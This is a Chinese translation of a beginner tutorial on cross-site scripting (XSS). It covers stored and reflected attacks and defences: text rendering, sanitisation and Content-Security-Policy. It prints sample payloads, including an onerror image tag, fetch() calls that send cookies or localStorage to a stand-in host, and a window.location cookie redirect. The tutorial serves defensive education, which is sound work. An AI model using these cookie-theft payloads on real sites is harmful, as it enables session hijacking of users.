<html>
<head>
<title>XSS Attacks for Beginners and How to Defend Against Them</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">初学者的XSS攻击及如何防御</h1>
<blockquote>原文：<a href="https://javascript.plainenglish.io/xss-attacks-for-beginners-and-how-to-defend-against-them-79347514488a?source=collection_archive---------5-----------------------#2022-06-03">https://javascript.plainenglish.io/xss-attacks-for-beginners-and-how-to-defend-against-them-79347514488a?source=collection_archive---------5-----------------------#2022-06-03</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><figure class="gl gn jl jm jn jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi jk"><img src="../Images/29b481ab224cd4fa78f902587f577dba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ddzh1bvKK70Kl_rvcb3B6g.jpeg"/></div></div><figcaption class="jv jw gj gh gi jx jy bd b be z dk">Cross-site scripting (javascript injection) attack was performed on Twitter by this tweet.</figcaption></figure><p id="58ad" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">跨站脚本(XSS)攻击是一种注入式攻击，在这种攻击中，恶意脚本可能被注入到文档中并被执行。据<a class="ae kx" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="noopener ugc nofollow" target="_blank">owasp.org</a>:</p><p id="2bca" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><em class="ky">“跨站点脚本(XSS)是一个误称。该名称源于早期版本的攻击，其中跨站点窃取数据是主要焦点。从那以后，它已经扩展到包括基本上任何内容的注入，但是我们仍然称之为XSS。XSS是严重的，可能导致帐户冒名顶替、观察用户行为、加载外部内容、窃取敏感数据等。”</em></p></div><div class="ab cl kz la hr lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="ig ih ii ij ik"><p id="1e74" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">假设您构建了一个应用程序，它接受用户的一些输入，然后将其显示为h1。这是通过使用jquery将h1的内部HTML设置为按钮单击时的输入值来实现的:</p><figure class="lh li lj lk gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi lg"><img src="../Images/17d117f2fc2c465c139fd5e89f481759.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*GU8y6t4WG9VoNSYEddtAgg.gif"/></div></div><figcaption class="jv jw gj gh gi jx jy bd b be z dk">Take user input and set it as inner HTML</figcaption></figure><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="30d8" class="lq lr in lm b gy ls lt l lu lv">$("button").click(function(){         //on button click<br/>  var input = $("input:text").val()   //grab user input<br/>  $("h1").html(input)                 //set h1’s inner html as input<br/>})</span><span id="8370" class="lq lr in lm b gy lw lt l lu lv">//for react we would use &lt;h1 dangerouslySetInnerHTML={{ __html: input}} /&gt;</span></pre><p id="884c" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">如果用户使用HTML <script>标签在输入框中注入JavaScript代码，而不是一些字符串，会怎么样？&lt;/root&gt;</script></p><figure class="lh li lj lk gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi lx"><img src="../Images/e8581b092f9176b4639ad0772cd71f50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*L-ItexI6T8Zjm8gcL9InHA.gif"/></div></div><figcaption class="jv jw gj gh gi jx jy bd b be z dk">User inputs some js code and😲 😲 😲</figcaption></figure><p id="bdcf" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">如您所见，用户注入的JavaScript代码被执行了。在上面的示例中，这只是一个简单的警报语句，但是，攻击者可以利用它来执行任何他想要的恶意代码，例如通过获取cookie(本地存储)来劫持用户的会话，并通过HTTP请求将其发送到自己的服务器:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="6769" class="lq lr in lm b gy ls lt l lu lv">&lt;script&gt;fetch("http://www.example.com?stolenGoods=window.localStorage")&lt;/script&gt;</span></pre><p id="28a7" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">大多数现代web浏览器和框架(如react)都有内置机制，通过使用Script标签将JavaScript设置为内部HTML来防止注入JavaScript。最有可能的是，js代码将被忽略。然而，还有许多其他方式来执行这种攻击，例如使用"<strong class="kb io"> onerror "、" onclick "和" onmouseover" </strong> HTML属性:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="e6aa" class="lq lr in lm b gy ls lt l lu lv">&lt;img src="ImageThatDoesNotExist.jpg" onerror="hackersCode()"&gt;</span></pre></div><div class="ab cl kz la hr lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="ig ih ii ij ik"><p id="662d" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">您可能想知道:如果用户能够在我的网站上执行一些JavaScript代码，那又怎么样？毕竟，他无论如何都可以通过控制台做到这一点。为什么我要担心阻止用户在我的网站上运行他自己的脚本，窃取他自己的cookies和他已经拥有的数据？</p><p id="18da" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">当用户输入被传送到你的后端服务器时，问题就出现了，在那里它也可能被存储在某个数据库中，从那里它可能被其他用户检索。</p><p id="f8c2" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">假设这是一个类似Reddit的应用程序上的帖子:</p><ol class=""><li id="d8a7" class="ly lz in kb b kc kd kg kh kk ma ko mb ks mc kw md me mf mg bi translated">要创建一个新的帖子，您可以在输入框中以HTML的形式写下它，然后向yourwebsite.com发送一个HTTP请求，将帖子作为查询参数(？post=)。</li><li id="c5d9" class="ly lz in kb b kc mh kg mi kk mj ko mk ks ml kw md me mf mg bi translated">您的服务器接收这个请求，创建帖子并将其保存在数据库中。</li><li id="3a22" class="ly lz in kb b kc mh kg mi kk mj ko mk ks ml kw md me mf mg bi translated">希望看到该帖子的其他用户将向服务器发送请求，然后服务器将从数据库中检索该帖子并发送给用户。</li><li id="69df" class="ly lz in kb b kc mh kg mi kk mj ko mk ks ml kw md me mf mg bi translated">文章将以HTML格式显示给用户。</li></ol><p id="533a" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">现在考虑这个场景:攻击者<strong class="kb io"> A </strong>通过将脚本作为用户输入来注入一些脚本，脚本现在存储在您的数据库中。</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="add0" class="lq lr in lm b gy ls lt l lu lv">const attackersPost = "&lt;script&gt;hackersCode()&lt;/script&gt;";<br/>fetch("https://www.yourwebsite.com/posts/add?post=" + attackersPost)</span></pre><p id="ec61" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">现在，某个想要查看<strong class="kb io"> A </strong>的帖子的用户<strong class="kb io"> B </strong>将会不知不觉地执行由<strong class="kb io"> A </strong>注入的从数据库中获取的脚本。这样，所有查看该帖子的用户都将被黑客攻击！！！这被称为存储XSS攻击。</p><p id="3d0d" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><strong class="kb io">储存的XSS攻击:</strong></p><p id="6476" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">注入的脚本存储在服务器上，当受害者试图访问存储的数据时，被受害者检索并执行。</p><p id="c734" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><strong class="kb io">映XSS的攻击:</strong></p><p id="04b7" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">如果攻击者让受害者以某种方式将脚本注入网站，而不是攻击者必须这样做，会怎么样？</p><p id="851f" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">让我们以上面的例子为例，用户的输入被发送到服务器，然后通过设置内部HTML反射回用户并显示在DOM上。攻击者可以通过电子邮件、社交媒体或其他社交工程方法向其目标发送链接。该电子邮件包含一个链接:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="96c1" class="lq lr in lm b gy ls lt l lu lv">https://www.yourwebsite.com/posts/add?post=<strong class="lm io">&lt;script&gt;fetch("http://www.example.com?stolenGoods=" + document.cookie)&lt;/script&gt;</strong></span><span id="c11d" class="lq lr in lm b gy lw lt l lu lv">//the malicious script will send the victim's cookie to the attacker's server and the attacker can use it to hijack the victim's session on yourwebsite.com!!!</span></pre><p id="dcfa" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">当受害者点击此链接时，一个HTTP请求被发送到yourwebsite.com的服务器，在那里将创建一个帖子，该帖子将恶意脚本作为数据。这篇文章将被反射回受害者(或其他想要查看这篇文章的用户)，当您的网站试图设置内部HTML时，注入的脚本将被执行，受害者的cookie将被发送到攻击者的服务器。😵 😵 😵</p></div><div class="ab cl kz la hr lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="ig ih ii ij ik"><p id="3287" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><strong class="kb io">如何防御JavaScript注入攻击:</strong></p><p id="2402" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">通过将用户输入设置为文本而不是HTML，我们可以很容易地防止第一个示例中的攻击:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="5d9c" class="lq lr in lm b gy ls lt l lu lv">//instead of<br/>$("h1").html(input)</span><span id="0852" class="lq lr in lm b gy lw lt l lu lv">//use this<br/>$("h1").text(input)</span></pre><p id="39b0" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">同样，对于react，尽量避免使用dangerouslySetInnerHTML属性来设置内部HTML。</p><p id="b47d" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">但是在您的应用程序中可能会有一些需要设置内部HTML的场景。为了防止用户在这种情况下向您的网站注入脚本，您可以在将用户输入设置为HTML之前"<strong class="kb io">净化"</strong>。净化将使任何隐藏在HTML中的脚本变得无用。一个流行的npm包可以帮你做到这一点，它就是<a class="ae kx" href="https://www.npmjs.com/package/sanitize-html" rel="noopener ugc nofollow" target="_blank"> sanitize-html </a>。</p><p id="169c" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">除此之外，我们还可以在服务器端建立机制来防止此类攻击。一种流行的方法是使用“<strong class="kb io">Content-Security-Policy</strong>”HTTP头。根据<a class="ae kx" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="noopener ugc nofollow" target="_blank"> MDN </a>:</p><p id="c844" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><em class="ky">“CSP通过指定浏览器应视为可执行脚本有效来源的域，使服务器管理员能够减少或消除XSS发生的媒介。然后，CSP兼容浏览器将只执行从那些允许的域接收的源文件中加载的脚本，而忽略所有其他脚本(包括内联脚本和事件处理HTML属性)。”</em></p><p id="c206" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">因此，在您的服务器端，您可以将这个头添加到发送HTML文件的HTTP响应中，例如index.html，这将意味着您的文档(HTML)不会执行不是来自您的website.com的脚本:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="5a14" class="lq lr in lm b gy ls lt l lu lv">res.set("Content-Security-Policy", "script-src https://www.yourwebsite.com")</span><span id="5701" class="lq lr in lm b gy lw lt l lu lv">// this means that only scripts from yourwebsite.com will be executed. No inline scripts or scripts from other sources.</span></pre><p id="91de" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><em class="ky">*请注意，如果您从白名单域中返回的js本身遭到破坏，那么js注入攻击仍然是可能的。</em></p><p id="d55a" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">您还可以设置CSP的"<em class="ky"> connect-src" </em>属性来指定您的脚本可以将所有域请求发送到什么，这样请求就不会发送到攻击者的域。当我尝试使用fetch API向example.com发送请求时，控制台中出现了以下错误:</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="e5e8" class="lq lr in lm b gy ls lt l lu lv">fetch("https://www.example.com?q=" + document.cookie)</span><span id="998d" class="lq lr in lm b gy lw lt l lu lv">Refused to connect to 'https://www.example.com/' because it violates the following Content Security Policy directive: "connect-src https://localhost https://accounts.google.com https://medium.com https://*.medium.com https://*.medium.com https://medium.com https://*.medium.com 'self'".</span></pre><p id="50e7" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><em class="ky">*请注意，攻击者仍然可以使用</em>窃取您的cookies(或其他信息)</p><pre class="lh li lj lk gt ll lm ln lo aw lp bi"><span id="c0c1" class="lq lr in lm b gy ls lt l lu lv">window.location = "https://www.example.com?q=" + document.cookie</span></pre><p id="7f1e" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">在这里，你可以找到更多关于如何保护cookies和本地存储的信息。以下是所有<a class="ae kx" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" rel="noopener ugc nofollow" target="_blank"> CSP指令</a>的列表。请记住，CSP检查是由浏览器强制执行的，因此如果用户在其浏览器中禁用此检查，她将容易受到攻击。</p></div><div class="ab cl kz la hr lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="ig ih ii ij ik"><p id="a0ab" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">好了，您已经在将用户输入设置为HTML之前对其进行了净化，您也已经在文档响应中设置了CSP头，并且您已经确保来自白名单域的脚本不会受到危害，那么您的网站现在完全不会受到XSS攻击了吗？</p><p id="f750" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">不完全是，脚本仍然可以通过其他来源注入，如第三方库和软件包、浏览器插件或第三方广告！请确保使用npm audit来审核您的依赖项是否存在已知的安全问题。</p><p id="1a29" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated">这里有一个有趣的方法来练习XSS攻击，然后再尝试攻击中型:<a class="ae kx" href="https://xss-game.appspot.com/level1" rel="noopener ugc nofollow" target="_blank">https://xss-game.appspot.com/level1</a>。</p><p id="00f6" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><em class="ky">更多内容请看</em><a class="ae kx" href="https://plainenglish.io/" rel="noopener ugc nofollow" target="_blank"><strong class="kb io"><em class="ky">plain English . io</em></strong></a><em class="ky">。报名参加我们的</em> <a class="ae kx" href="http://newsletter.plainenglish.io/" rel="noopener ugc nofollow" target="_blank"> <strong class="kb io"> <em class="ky">免费周报</em> </strong> </a> <em class="ky">。关注我们关于</em><a class="ae kx" href="https://twitter.com/inPlainEngHQ" rel="noopener ugc nofollow" target="_blank"><strong class="kb io"><em class="ky">Twitter</em></strong></a><a class="ae kx" href="https://www.linkedin.com/company/inplainenglish/" rel="noopener ugc nofollow" target="_blank"><strong class="kb io"><em class="ky">LinkedIn</em></strong></a><em class="ky"/><a class="ae kx" href="https://www.youtube.com/channel/UCtipWUghju290NWcn8jhyAw" rel="noopener ugc nofollow" target="_blank"><strong class="kb io"><em class="ky">YouTube</em></strong></a><em class="ky"/><a class="ae kx" href="https://discord.gg/GtDtUAvyhW" rel="noopener ugc nofollow" target="_blank"><strong class="kb io"><em class="ky">不和</em> </strong> </a> <strong class="kb io"> <em class="ky">。</em>T49】</strong></p><p id="abb2" class="pw-post-body-paragraph jz ka in kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ig bi translated"><strong class="kb io"> <em class="ky">对缩放您的软件启动感兴趣</em> </strong> <em class="ky">？检查</em> <a class="ae kx" href="https://circuit.ooo/?utm=publication-post-cta" rel="noopener ugc nofollow" target="_blank"> <strong class="kb io"> <em class="ky">电路</em> </strong> </a> <em class="ky">。</em></p></div></div>    
</body>
</html>